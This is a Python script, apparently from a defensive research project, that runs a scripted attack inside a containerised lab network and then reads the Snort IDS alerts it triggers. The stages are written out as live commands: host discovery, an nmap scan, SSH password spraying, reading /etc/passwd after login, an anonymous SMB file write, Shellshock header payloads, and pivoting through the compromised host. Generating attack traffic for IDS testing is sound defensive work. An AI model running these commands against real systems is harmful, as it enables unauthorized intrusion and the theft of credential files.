"""
Execute an alternate multi-stage attack against the digital twin.

This scenario is intentionally similar to run_attack.py, but changes the order
and emphasis of the activity so it can be used as a second repeatable attack
sample. It runs from the client container (10.0.1.11) and targets services in
the server network (10.0.2.0/24).
"""

from __future__ import annotations

import logging
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from llm_ir_dt.docker_manager.docker_manager import DockerManager


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)8s] %(message)s "
    "(%(filename)s:%(lineno)s)",
)
logger = logging.getLogger(__name__)

CLIENT = "client"


def run(command: str) -> str:
    """
    Execute a command on the client container and log its result.

    The attack script keeps going even when individual probes fail, because the
    goal is to generate realistic traffic and IDS evidence across stages.
    """
    result = DockerManager.exec_run(CLIENT, command)
    logger.info("[exit=%s] %s", result["exit_code"], command)
    output = str(result.get("output", "")).strip()
    if output:
        logger.info("Output:\n%s", output)
    return output


def main() -> None:
    """Run the alternate attack sequence and print resulting Snort alerts."""
    logger.info("=== Attack2 Stage 1: Low-and-slow host discovery ===")
    for target in ("10.0.2.11", "10.0.2.12", "10.0.2.13", "10.0.2.14", "10.0.2.15"):
        run(f"ping -c 2 -W 1 {target}")
        time.sleep(0.3)

    logger.info("=== Attack2 Stage 2: Service-specific TCP scan ===")
    run(
        "nmap -sT -Pn -p 22,80,139,445 "
        "10.0.2.11 10.0.2.12 10.0.2.13 10.0.2.14 10.0.2.15"
    )

    logger.info("=== Attack2 Stage 3: SSH password spray on server_ssh ===")
    for password in ("admin", "password", "password123"):
        run(
            "sshpass -p "
            f"{password} "
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 "
            "admin@10.0.2.11 'whoami; hostname' 2>&1 || true"
        )
        time.sleep(0.5)

    logger.info("=== Attack2 Stage 4: Successful SSH access and local discovery ===")
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'id; uname -a; ip addr; ps aux | head -n 12' "
        "2>&1 || true"
    )
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'cat /etc/passwd; ls -la /home/admin' "
        "2>&1 || true"
    )

    logger.info("=== Attack2 Stage 5: SMB share probing and write attempt ===")
    run("smbclient -L //10.0.2.12 -N 2>&1 || true")
    run(
        "smbclient //10.0.2.12/share -N "
        "-c 'pwd; ls; put /etc/hostname attack2_payload.txt; ls' "
        "2>&1 || true"
    )

    logger.info("=== Attack2 Stage 6: Shellshock command probes ===")
    run(
        "curl -s -H 'User-Agent: () { :;}; echo; /usr/bin/id' "
        "http://10.0.2.13/cgi-bin/vulnerable 2>&1 || true"
    )
    run(
        "curl -s -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd' "
        "http://10.0.2.13/cgi-bin/vulnerable 2>&1 || true"
    )

    logger.info("=== Attack2 Stage 7: Web service probing ===")
    for target in ("10.0.2.13", "10.0.2.14", "10.0.2.15"):
        run(f"curl -s -o /dev/null -w 'http_status=%{{http_code}}\\n' http://{target}/")
        time.sleep(0.3)

    logger.info("=== Attack2 Stage 8: Pivot-style probes from compromised SSH host ===")
    run(
        "sshpass -p password123 ssh -o StrictHostKeyChecking=no "
        "admin@10.0.2.11 'ping -c 2 10.0.2.12; "
        "curl -s -o /tmp/attack2_shellshock_probe.html "
        "http://10.0.2.13/cgi-bin/vulnerable; "
        "head -n 5 /tmp/attack2_shellshock_probe.html' 2>&1 || true"
    )

    logger.info("=== Attack2 complete. Reading alerts... ===")
    time.sleep(3)
    alerts = DockerManager.read_alerts()
    logger.info("Total alerts: %d", len(alerts["alerts"]))
    for alert in alerts["alerts"]:
        logger.info(
            "Alert: [pri=%s cls=%s] {%s} %s -> %s %s",
            alert.get("priority", "-"),
            alert.get("classification", "-"),
            alert.get("protocol", "-"),
            alert.get("source", "-"),
            alert.get("destination", "-"),
            alert.get("message", alert["raw"]),
        )


if __name__ == "__main__":
    main()
